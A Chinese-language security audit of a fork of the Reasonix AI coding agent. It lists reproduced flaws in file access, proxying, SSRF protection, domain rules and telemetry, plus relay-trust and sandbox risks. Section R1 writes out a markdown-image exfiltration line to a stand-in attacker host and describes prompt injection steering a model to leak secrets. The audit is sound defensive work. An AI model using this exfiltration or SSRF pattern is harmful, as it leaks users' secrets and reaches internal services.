---
owner: @SivanCola
backup: @esengine
status: active
reviewed: 2026-10-12
---

# Reasonix fork 安全审计

后续修复、固定外联限制和依赖补充审查见 [修复记录](security-remediation-2026-10-12.md)。下文保留原始审计时的发现和复现状态。

审计对象：`d1f096b206af471f558029fc11316c21ee6aae57`，2026 年 10 月 12 日，Linux。目标是判断这个版本作为个人 fork 的基础时，会把哪些数据和权限交给模型、上游服务与扩展，以及实际安全边界有哪些缺口。

**结论：可以作为开发基础，但不宜原样用于敏感项目。确认了 5 项可复现的边界问题，另有外部图片自动请求、登录后自动开放云端访问、上游更新信任和默认凭据暴露等风险。没有找到足以认定作者植入恶意后门的证据；这不等于证明源码、依赖或发行二进制不存在后门。**

本次对仓库做入口和危险操作检索，并追踪重点路径：Go CLI 与桌面宿主、HTTP/SSE、Electron、模型客户端与 broker、文件与 shell 工具、权限与 OS sandbox、MCP/sidecar/hooks/LSP、安装与更新、凭据、遥测、账号、备份、反馈、市场、SSH、云端控制，以及三个 Workers 和发布 CI。

仓库有 7,714 个受 Git 跟踪的文件；这不是逐行审查所有文件的证明。核心调用链进行了代码审查和 Linux 本地验证，Workers、前端渲染及跨平台实现主要是静态审查。

没有运行真实模型会话、登录、云端控制、更新安装或向上游提交反馈；复现仅使用临时目录、虚构文件和 loopback 测试服务。依赖检查访问了公共 Go/npm 漏洞数据库，Go 构建下载了锁定依赖和工具链。未修改应用源码、配置、lockfile 或 Git 分支，未联系维护者。

## 优先级和证据

P1 表示建议在敏感用途或 fork 发布前处理；P2 表示需要收紧默认值或补充明确边界。以下区分可复现缺陷、源码确定的行为和依赖数据库告警。依赖告警数量不代表实际可利用漏洞数量。

| 编号 | 优先级 | 问题 | 证据 | 必要前提 |
| --- | --- | --- | --- | --- |
| F1 | P1 | 远程附件读取工作区外文件，drop 可授权外部目录 | 本地复现 | 已通过设备或云端入口认证的客户端，或持有 serve token 的客户端 |
| F2 | P1 | web_fetch 的 HTTPS 代理连接实际上是明文 | 本地复现 | 使用带凭据的 `https://` HTTP 代理 |
| F3 | P1 | install_source 的 SSRF 防护经 HTTP 代理失效 | 本地复现 | 配置 HTTP 代理，模型或用户预览恶意安装 URL |
| F4 | P2 | 单独配置 denied_domains 不产生封禁 | 本地复现 | allowed_domains 为空且 shell 网络打开 |
| F5 | P2 | 项目配置可覆盖用户关闭的桌面统计开关 | 本地复现及上报调用链 | 桌面宿主从该项目目录启动；正式版本且无环境 opt-out |
| R1 | P1 | 模型输出中的外部图片自动发起网络请求 | 源码及既有渲染测试 | 桌面或 Web 聊天渲染包含外部图片的消息 |
| R2 | P1 | 登录即注册云端设备，控制端认证信任中继 | 源码及既有握手测试 | 桌面账号已登录；中继或账号基础设施被控制 |
| R3 | P1 | fork 仍信任上游更新地址、签名密钥和远端 bootstrap | 源码 | 使用更新或 SSH 自动部署功能 |
| R4 | P1 | 默认允许较广读取、外网和部分主机权限 | 源码及 sandbox 测试 | 模型被诱导调用工具，或获授权的程序恶意 |
| R5 | P1 | MCP 和 v2 sidecar 通常以用户权限运行 | 源码；明确的完整信任契约 | 用户安装或启用扩展 |
| R6 | P2 | 上游遥测默认开启，关闭遥测仍可能有预连接 | 源码 | 正式桌面版本，或加载前端 HTML |
| R7 | P2 | JavaScript lockfile 有已知漏洞告警 | 公共数据库扫描 | 各告警另有具体触发前提 |
| R8 | P2 | Workers 的 cookie 认证需要明确 CSRF 和子域信任边界 | 静态检查 | 部署账号、论坛服务；尤其存在不可信同站子域时 |

## 已复现的边界缺陷

### F1 远程文件导入绕过工作区范围

[attachments.go](../../internal/frontend/serve/attachments.go) 的 `attachmentBytes` 在第 28 行开始，直接对客户端的 `path` 调用 `os.Stat` 和 `os.ReadFile`。第 116 行在处理请求时调用它，没有先验证路径位于工作区，没有调用敏感文件禁读规则，也没有把本机拖放路径功能限制为 host-only。

设置非图片 MIME 和文件名即可进入普通文件保存路径。

[cloud_desktop.go](../../internal/frontend/serve/cloud_desktop.go) 第 50 行将云端请求标记为 device reach 后交给正常 Hub handler。附件 endpoint 没有拒绝这个标记。复现通过这条实际路径，以一个工作区外的虚构 `.env` 文件作为来源，得到 HTTP 200；随后通过工作区文件读取接口读回全部虚构内容。

未启动模型、未批准文件工具、未读取真实凭据。请求身份由正常云端入口赋予；没有伪造运行时内部字段来绕过权限。

[drop.go](../../internal/frontend/serve/drop.go) 第 33 行同样接受远程路径并调用 `DroppedRef`；[dropped.go](../../internal/session/control/dropped.go) 为工作区外路径注册 session reference。复现确认云端客户端能为外部目录获得有效 reference。这里证明的是授权范围扩大；没有把所有后续工具对该目录的权限都视为已经绕过。

影响：已认证的远程客户端可以读取 Reasonix 进程权限内的普通文件，将其复制进工作区，再通过读取接口拿走。上层鉴权仍然存在，所以不是互联网匿名读取漏洞；它突破的是项目明确声明的远程客户端工作区边界。若 R2 的中继信任受到破坏，这条读取路径会放大影响。

修复方向：远程客户端只能上传 bytes；本机路径导入必须验证 host-only authority。确需支持远程按路径导入时，用安全的工作区根访问并执行禁读策略。`/drop` 的外部目录授权也必须只接受本机用户明确操作。验收至少覆盖云端、LAN、serve、外部目录、symlink 和凭据文件。

### F2 HTTPS 代理凭据以明文发送

[webfetch.go](../../internal/tools/builtin/webfetch.go) 第 82 行把 `http` 和 `https` 代理放在同一分支，第 104 行使用普通 TCP `DialContext` 连接代理，随后直接写 CONNECT；没有与 HTTPS 代理完成 TLS 握手。配置的用户名和密码以 Basic `Proxy-Authorization` 加在这个明文请求里。

复现使用本机明文假代理，将客户端配置成 `https://dummy-user:dummy-password@127.0.0.1:<port>`。假代理成功解析到了明文 CONNECT 和 Basic header，而真正的 HTTPS 代理应首先收到 TLS ClientHello。

影响：代理凭据及目标主机信息可被链路上的观察者读取。最终网页使用 HTTPS 时，目标网页的 TLS 与代理链路的 TLS 是两层不同保护；前者不修复代理认证泄漏。连接真正的 TLS-only 代理时也可能直接失败。

修复方向：为 HTTPS 代理建立并验证 TLS 后再发 CONNECT，或使用已有正确处理 HTTPS 代理的实现。不能通过关闭证书验证解决。验收分别检查 HTTP、HTTPS、SOCKS 代理、认证及失败路径。

### F3 安装源经代理绕过 SSRF

[ssrf.go](../../internal/ext/installsource/ssrf.go) 第 21 行复制 transport 并保留 `Proxy`，第 40 行开始的检查仅装在 `DialContext`。Go 使用 HTTP 代理时，dial 的地址是代理地址；目标 URL 的 IP 没有受到这层判断。

复现将代理设为本机假代理，请求 `http://169.254.169.254/audit-only`。该 IP 明确位于自身 `blockedFetchIP` 的封禁范围，却被原样转交给代理，并成功取得假代理返回的虚构响应。复现没有访问真实云元数据服务。

此外，`web_fetch` 的代理分支仅检查目标 IP literal，域名由代理解析。对恶意域名指向内网的情况，防护依赖代理自身的策略，应用不能独立保证。直连时的解析后固定 IP 防护没有这个代理缺口。

影响：攻击者提供的安装预览地址可能触达代理可访问的云元数据或内网服务。安装预览在权限层被当作只读操作处理，因此不能把后续安装确认当作这次网络读取的门禁。

修复方向：在代理模式也检查请求目标；域名解析在代理端进行时，必须使用能执行目标地址策略的受控代理，或明确拒绝无法验证的路由。增加通过假代理访问禁用 IP、重定向到内网和域名解析到内网的测试。

### F4 黑名单单独配置时静默失效

[tool_environment.go](../../internal/assembly/boot/tool_environment.go) 第 107 行开始的 `routeEgress`，在 `AllowedDomains` 为空时立即返回，尚未使用 `DeniedDomains`。例如只设置 `denied_domains = ["example.com"]`，不会创建 egress proxy、不会关闭网络，也没有警告。

复现确认这条配置路径留下 `Network=true` 且 `Egress=nil`。这个判断发生在平台探测之前，不是当前 Linux backend 不支持导致的结果。它不证明配置了非空 allowlist 的 deny 规则也失效。

修复方向：支持 deny-only 策略，或拒绝这个组合并明确提示。验收要求被禁止域名确实连接失败，而不是只检查配置解析成功。allowlist 不应被拿来假装成任意域名黑名单的等价物。

### F5 工作区能重新打开桌面指标

[load_project.go](../../internal/contract/config/load_project.go) 第 11 行及第 37 行保存和恢复 CLI `TelemetryConfig`，但没有保存桌面的 `Telemetry`、`Metrics`。项目 `reasonix.toml` 可以覆盖这两个开关。

复现：用户配置 `[desktop] telemetry=false, metrics=false`，项目配置把两者设为 true；`LoadForRootReadOnly` 返回的两个 getter 都是 true。[main.go](../../cmd/reasonix-studio-host/main.go) 第 323 行从当前目录加载配置，第 341 行用这两个 getter 启动 reporter 并包装事件 sink。

限制必须保留：每日 ping 的 `PingAllowed` 会重新读取用户配置，因而这条路径没有证明能绕过用户关闭的每日 ping。聚合指标的 sink 和 pending flush 没有同一校验，可被重新启用并在后续启动时上报。`DO_NOT_TRACK`、`REASONIX_TELEMETRY=off` 仍能阻止 reporter 启动。

修复方向：两个桌面隐私开关都归用户全局配置；每次发送指标前重新核实开关，关闭后清理待发送队列。验收应到实际上传边界，同时覆盖项目覆盖、运行中关闭和下次启动。

## 隐私和信任关系

### R1 外部图片可成为隐蔽的数据外发通道

[Markdown.tsx](../../desktop/frontend-next/src/ui/Markdown.tsx) 第 203 行把外部图片 URL 直接放入 `<img src>`，第 226 行 `images` 默认 true；既有测试明确期待外部图片 URL 被保留。HTML sanitizer 不能阻止正常图片地址产生请求。版本说明使用 `images=false`，聊天消息没有同等默认保护。

只要模型输出 `![...](https://attacker.example/pixel?data=...)`，浏览器就可能自动请求这个 URL。攻击者能收到 IP、时间和 URL 中的值；如果模型已见到私密内容，并被 prompt injection 诱导编码到 URL，图片加载就成为外发路径。这里确认自动加载机制，没有声称真实模型已被成功诱导泄漏生产数据。

该请求不经过 Bash permission 或 Bash 的 allowed_domains。

建议默认阻止远程图片，用户按 origin 明确允许后加载，并给页面设置可执行的网络策略。仅提供全局遥测开关不能阻断这条路径。

### R2 云端控制仍然信任上游运营方

[main.go](../../cmd/reasonix-studio-host/main.go) 第 423 行的 `startCloudRemote` 无独立的远程启用开关；宿主启动时调用它。

[host.go](../../internal/platform/remotecloud/host.go) 的 Run 在账号 token 存在时自动注册或恢复设备并连接中继，第 281 行注册 `tasks`、`logs`、`files`、`desktop` capabilities，同时发送机器名、平台和设备公钥。没有账号时不会注册或连接远程中继。

加密使用 X25519、HKDF-SHA256 和 AES-GCM，算法本身不是这里的问题。[host.go](../../internal/platform/remotecloud/host.go) 第 468 行接受中继传来的控制端公钥，第 510 行使用中继提供的 scopes；[crypto.go](../../internal/platform/remotecloud/crypto.go) 第 39 行的握手没有本机独立批准、已配对公钥 pin 或独立签名验证。

控制端网页也从账号服务取得设备公钥，并依赖上游托管的 JavaScript。

因此，恶意或被攻陷的中继可发来自己的公钥和权限，建立它能解密的会话并使用云端接口。既有 `TestHandshakeAndPingCrossTheDirectedEncryptedChannel` 覆盖了任意控制端公钥经同一 handler 建立会话并读取 backend 的机制。本次没有攻击真实中继，也没有证明普通互联网用户能越过正常账号认证。

对 fork 而言，这是必须显式接受的远程信任关系，不能宣称“端到端加密，所以服务器无法介入”。建议默认关闭云端访问，与账号登录分离；首次配对由本机用户批准并绑定身份，权限保存在本机，支持立即撤销。

本仓库没有包含可完整审查的 `remote.reasonix.io` 中继实现，也没有包含客户端调用的全部 remote/backups 后端，线上授权及数据留存不能据此验证。

### R3 fork 需要接管更新与发行身份

桌面更新从 [hub.go](../../internal/platform/update/hub.go) 的 `StudioCatalog` 读取上游 `dl.reasonix.io/studio/versions.json`；[verify.go](../../internal/platform/update/verify.go) 第 20 行内嵌上游 minisign 公钥。桌面 artifact 校验签名和 SHA-256，这是有效保护，但保护的是“由上游密钥签发”，不是“由你的 fork 签发”。

artifact 下载完成并不等于已经安装；当前应用更新路径还要求用户允许 restart。

[releaseasset/cli.go](../../internal/platform/releaseasset/cli.go) 第 28 行把 SSH 自动部署的 CLI 固定为上游 GitHub release。该路径使用同一 release 的 SHA256SUMS 和受限重定向，未发现 minisign 验证；它信任 GitHub release 账户和 HTTPS 分发链。若 fork 保留原行为，远端可能部署原版 Reasonix。

需要整体更换 repo/release namespace、更新目录、下载镜像、签名公钥、npm scope、应用身份和 state roots；检查发布脚本与 URL allowlist 是否同步。只改名字或 UI 图标不够。当前没有证据说明上游已滥用更新权限。

### R4 默认沙箱主要保护写入

默认 Bash 网络开启；Linux/macOS 默认读到大量主机文件，只屏蔽枚举出的凭据路径与额外 forbid roots。默认 ssh-agent authority 可用于签名；Docker/Podman 有专门治理，DBus、X11、Wayland、gpg-agent 及任意其他 IPC 没有统一隔离承诺。默认 shell 无法等同于只可读写工作区的容器。

[config.go](../../internal/contract/config/config.go) 第 230 行定义的 `filter_subprocess_env` 和 `protect_sensitive_files` 默认 false。自身 credential store 的已注册变量会过滤，纯凭据文件默认禁读；但项目 `.env`、`~/.npmrc`、GitHub CLI 的混合配置等仍可能可读，其他继承的 token 环境变量也可能到达 Bash/hooks/LSP/MCP。

[redact.go](../../internal/base/secrets/redact.go) 第 151 行明确说明普通工具输出、模型内容和会话记录不做凭据脱敏。

结果是：模型被诱导读取可见秘密后，秘密可能进入会话、模型请求或可见网络通道。read-only 只限制写入，不能保证保密。[write_fence.go](../../internal/safety/permission/write_fence.go) 第 42 行还保留无 approver 时普通 Ask 自动允许的无人值守语义；必须人工回答的特殊能力会拒绝。

默认 `ask` 不能在所有 headless 场景被当作“等人确认”。

Windows 当前没有 Bash OS 沙箱，设置强制 off，不能把 Linux 上通过的文件和网络隔离测试推广到 Windows。macOS 的 Mach/Apple Events delegation 也没有完整约束或当前主机验证。

建议敏感项目使用专用 OS 用户、容器或 VM；显式选择严格的读根、去除非必需环境变量与 IPC、按需开放网络。不要依赖路径黑名单或模型提示词替代 OS 权限。

### R5 扩展安装相当于安装本机程序

[pluginspec.go](../../internal/ext/pluginspec/pluginspec.go) 第 90 行明确说明普通用户 MCP 默认 `host` mode，confined 是内部部署或测试 opt-in。MCP 工具调用的权限校验不能约束 server 进程自己访问主机的行为。

[sidecar/process.go](../../internal/ext/extension/sidecar/process.go) 第 167 行原样继承 `os.Environ()`，第 186 行直接启动 runtime，没有 OS sandbox。这包括已装入宿主进程的 API key、账号 token 等；即使启用 `filter_subprocess_env`，完整信任 sidecar 也不走这个过滤。

项目对此有明确 FULL TRUST 文档和安装预览，不能称为隐藏后门，也不是未授权的默认启动。

fork 建议先限制第三方可执行 runtime，并把“文本 skill”“MCP host process”“full-trust sidecar”分别展示真实权限。固定 commit/digest、内容预览和人工安装批准很有价值，但不等于代码本身安全。

### R6 默认遥测与被动网络提示

桌面 `telemetry`、`metrics` 默认 true。每日 ping 含持久 128-bit install ID、版本、OS、arch、surface；服务商还能从网络获取来源 IP。更准确的称呼是可持续关联的安装标识，不是完全不可关联的匿名。

指标上传为 signal/bucket/count，加版本、OS、surface；当前上传代码中没有找到将对话全文、仓库文件或 API key 自动塞进这些 payload 的路径。

CLI 与桌面不同：正式交互运行会进行首次同意询问；auto 不覆盖一般 headless/CI/development。`DO_NOT_TRACK` 和 `REASONIX_TELEMETRY=off` 参与 opt-out，开发版本不启动 reporter。CLI crashreport 会先保存脱敏报告，发送属于显式用户操作。配置注释提到 native crash diagnostics，但这不构成当前自动上传完整原生 dump 的证据。

[index.html](../../desktop/frontend-next/index.html) 第 6 行开始包含账号和中继域名的 preconnect/dns-prefetch，即使未登录或遥测关闭，浏览器也可能解析或预连接上游。这不是发送仓库内容，但不符合“只访问用户选择的模型服务”的严格隐私目标。

## 网络访问清单

| 访问主体 | 去向 | 触发 | 能离开本机的数据 |
| --- | --- | --- | --- |
| 模型客户端 | 用户配置的 provider，默认含 DeepSeek；预设还包含其他厂商与中转 | 对话、独立总结或配置过的模型功能 | 系统提示、用户文本、投影记忆、工具输出、读到的代码、图片及认证 header |
| web_search | 配置的搜索 provider | 模型调用搜索 | 独立 query；不自动附整段历史，但 query 可含模型复制的私密内容 |
| system_one | 配置的 decision backend，TypeSafe 默认地址为 `api.typesafe.ai` | 配置了 key/decision 模型并调用工具 | 工具的 state、questions、instructions、criteria 和认证；不是无配置自动发出 |
| web_fetch | 工具参数中的任意 http/https URL | 默认只读工具调用 | URL/query、标准 header；代理认证；可读取返回内容 |
| Bash | 任意网络或配置 allowlist | shell 命令 | 命令能够访问的数据；network 默认 true |
| 桌面遥测 | `crash.reasonix.io/v1/ping`、`/metrics` | 正式桌面版本默认开启 | install ID 与运行平台；分类计数，不是会话全文 |
| CLI crashreport | `crash.reasonix.io/v1/report` | 用户选择发送 | 脱敏的错误类别、stack、版本和平台 |
| 反馈与跟进 | `crash.reasonix.io` | 用户提交或打开跟进 | 用户填写的正文、附件和环境信息，及关联标识；存在公开 issue 同步流程 |
| 市场 | `crash.reasonix.io` registry | 浏览、搜索、安装、投票、发布 | 搜索 query、包标识；安装计数标识；需要账号的操作使用账号 token |
| 账号客户端 | `id.reasonix.io`，可由宿主环境覆盖 | 登录、账号面板；已登录云端运行 | device flow 信息、Bearer session token、账号查询 |
| 云端宿主 | `remote.reasonix.io` WebSocket | 桌面已登录后自动启动 | 机器名、设备身份、平台、公钥；中继携带路由/scopes/密文；见 R2 信任限制 |
| 云端网页 | `id.reasonix.io`、`remote.reasonix.io`、`reasonix.io/remote/` | 打开远程页面或 device query | 账号 cookie、授权请求、会话 ticket、控制请求 |
| 前端 HTML | `id.reasonix.io`、`remote.reasonix.io` | 解析 HTML 时的预连接提示 | DNS/TLS 网络元数据，实际执行取决于浏览器 |
| Markdown 图片 | 消息中的图片 URL | 自动渲染 | IP、URL/query，可能包含模型拼入的秘密 |
| Agent browser/computer | 页面 URL、网站子资源及使用的应用 | 启用相应工具后 | 浏览器行为、表单或上传内容；不是 Bash 网络策略覆盖的范围 |
| MCP/sidecar/hooks/LSP | 各程序选择的网络服务 | 启用或执行程序 | 进程可访问的文件、环境、授权 token 及收到的工具参数 |
| 桌面更新 | `dl.reasonix.io`、GitHub release/CDN | 检查版本、用户下载/更新 | 版本、OS/arch、来源 IP；下载可执行文件，见 R3 |
| SSH 自动部署 | 上游 GitHub releases、配置的 SSH 主机 | 连接/部署远端 | 连接元数据、远端命令与文件；provider broker 可把远端模型请求交回本机 |
| 云备份 | `id.reasonix.io/me/backups` | 用户创建或恢复 | 加密 envelope；明文 label、类别、版本、平台、大小 |
| Workers 邮件 | `api.resend.com/emails` | 注册、验证、重置等 | 邮箱、邮件正文和短期验证链接；仅部署相应服务时 |
| 发布与维护 CI | GitHub、npm、Cloudflare R2、签名/公证及模型服务 | GitHub workflow | 发布产物、维护内容、显式提供的 CI secrets；不属于客户端常驻流量 |

额外信任提示：`proxy_mode=off` 表示直连，不表示离线。`[sandbox] network=false` 和 allowed_domains 主要管 Bash，不能当作整个应用、模型、渲染器和全部扩展的网络总开关。原始字面 URL/host 索引见 [network-literals.json](security-audit-2026-10-12/network-literals.json)，含配置预设与示例，不能把每个字面地址都理解为默认会连接。

## 依赖和发布链

按仓库 `toolchain go1.26.9` 对 CLI 和桌面宿主做 `govulncheck -scan=package`，没有发现导入包命中已知漏洞。module 扫描报告 `golang.org/x/crypto/openpgp`，但上述入口没有导入这个包。初始本机 Go 1.26.5 扫描报告的 21 项标准库告警，不归因于仓库已经锁定的 1.26.9。

依赖扫描不审查依赖有没有恶意逻辑，也不证明运行中的已有二进制用了指定工具链。

JavaScript 按现有 lockfile 查询公共数据库，未执行 install 或升级：

| 范围 | 数据库结果 | 判断 |
| --- | --- | --- |
| frontend production dependencies | 1 条 low 告警，传递 KaTeX `0.16.47` | 顶层 `0.19.0` 没消除 `rehype-katex`/math 依赖中的旧版本；该漏洞要求先存在 prototype pollution，不是本次确认的独立 XSS |
| Electron 构建依赖 | 27 条告警记录，12 high、11 moderate、4 low | 涉及 undici、fast-uri、brace-expansion、http-cache-semantics、sprintf-js；不同版本记录会重复。主要是下载/打包依赖，没有据此证明应用运行时存在 12 个高危漏洞 |
| accounts/forum production dependencies | 各 4 条 moderate 告警，Hono `4.13.0` | crash Worker 同样锁定 `4.13.0`，npm 把四条聚合为一个 vulnerable package；需要按使用 API 逐条判断 |

KaTeX 的前提和修复版本见 [维护者 advisory](https://github.com/KaTeX/KaTeX/security/advisories/GHSA-238p-pmpm-9mq7)。Hono 的 JSX 告警只涉及特定 SSR boundary，当前 Workers 未看到使用这个 API，见 [维护者 advisory](https://github.com/honojs/hono/security/advisories/GHSA-hxh3-vqpv-xpqv)。

undici 的 TLS 告警针对 BalancedPool connect options，扫描命中不能替代调用点核实，见 [维护者 advisory](https://github.com/nodejs/undici/security/advisories/GHSA-w293-vg96-wgc3)。完整结果保存在 evidence 目录。

CI 中检查到多处 Actions 已锁 commit SHA，下载 SimplySign/NSIS 有固定 hash，桌面更新校验 minisign，archive 有路径、symlink 和大小限制；没有确认可从外部 PR 直接取得发布密钥的路径。`e2e-bot` 会用 provider secret 执行 PR-head 程序，依赖 trusted commenter 和 `e2e-bot` environment 的审批配置。

fork 必须实际配置 required reviewers；YAML 中写了 environment 名不证明 GitHub 设置已启用审批。没有审查上游账号权限、实际 CI secret 配置或发行 artifact 与源码的一致性。

## Workers 的边界

三个 Workers 是可部署服务，不是普通 CLI 自动启动的后台服务。检查到 SQL 参数绑定、token hash/pepper、随机 device code、登录限流和账号角色控制，没有把这些正常功能认定为后门。

账号/论坛的 CORS 只控制浏览器是否能读取响应，不能代替 CSRF。[accounts 的 parseBody](../../workers/accounts/src/lib/validation.ts) 第 60 行对请求调用 JSON 解码而不要求 JSON Content-Type；账号和论坛没有统一的 Origin/CSRF 拒绝层。账号 cookie 为 SameSite=Lax，默认 Domain 为 `.reasonix.io`。

这会扩大对所有子域的信任：被接管的同站子域可收到域 cookie，普通外站的 cookie-authenticated POST 又受到 SameSite 的限制，不能简单称作匿名账号接管。

建议部署 fork 时使用 host-only cookie，按 cookie 与 Bearer 客户端分别设定 CSRF 策略，拒绝非预期 Origin 与 Content-Type，并验证登录 CSRF、设备批准和同站子域场景。本次尚未完成 Workers 浏览器攻击复现，因此保留为静态发现的加固项。crash dashboard 自身有显式 sameOrigin 保护，不应把账号/论坛判断泛化到整个服务集。

## 验证结果和限制

| 检查 | 结果 |
| --- | --- |
| 5 个新增本地探针 | 全部复现预期缺陷；源码通过 Go overlay 运行，应用文件未修改 |
| remotecloud、permission、redirectguard、secrets、configbackup、egress、providerbroker 的原有 Go suites | 通过 |
| serve 的 CloudDesktop、auth-disabled、loopback、attachments、CSRF 相关测试 | 通过；现有测试通过不代表覆盖了 F1 |
| config 项目 scope 的限制测试 | 通过；新增探针仍确认 F5 |
| Linux sandbox、credential read、credential network、egress effect 选定测试 | 通过；macOS-only 项目跳过，不算通过 |
| installsource 全套测试 | 初次因 shell umask=077 得到 0700 而非预期 0755，权限断言失败；在独立 shell 的 umask=022 下全套通过。不是通过禁用测试解决，也不把更严格文件权限认定为泄漏 |
| Electron unit suite | 112 项，109 通过、3 个 macOS-only 跳过、0 失败 |
| Go/npm 漏洞数据库 | 结果如上一节；包级与模块级结果分别记录 |

复现源码与日志见 [evidence](security-audit-2026-10-12/README.md)。这是五个特定路径的可达性证据，不是全应用渗透测试。没有验证真实模型 prompt injection 成功率、Windows/macOS 实机、线上中继和完整账号/备份后端、全部依赖源码、二进制可复现构建或历史提交中的恶意行为。

凭据形状扫描未发现显然的生产私钥/token，但无法识别任意自定义或加密隐藏秘密。

## fork 的处理顺序

1. 先修 F1，关闭远程客户端的本机路径导入和外部目录授权；默认关闭云端远程控制，账号登录与远程权限分离。
2. 默认关闭上游遥测和预连接，修 F5；远程图片默认要求用户批准；用 OS 隔离约束敏感文件和外发网络。
3. 修 F2/F3/F4，让代理 TLS、SSRF 和实际域名规则符合承诺。按进程分别治理 Bash、renderer、browser、MCP 与主应用网络。
4. 接管更新和签名体系、SSH bootstrap、包名、应用身份及状态目录；验收你的 fork 不会更新或部署成上游产品，也不会默认读取上游账号 token。
5. 明确扩展完整信任模式；升级并重新锁定 JS 传递依赖；配置发布 environment 审批和验证 artifact 来源。

完成前四项并在目标平台验证后，再让 fork 接触真实 API key、私有代码和公司内网。这些缺口中有的是授权边界漏洞，有的是产品主动选择的信任关系；两者都影响你的 fork，但不能混成对作者恶意意图的断言。
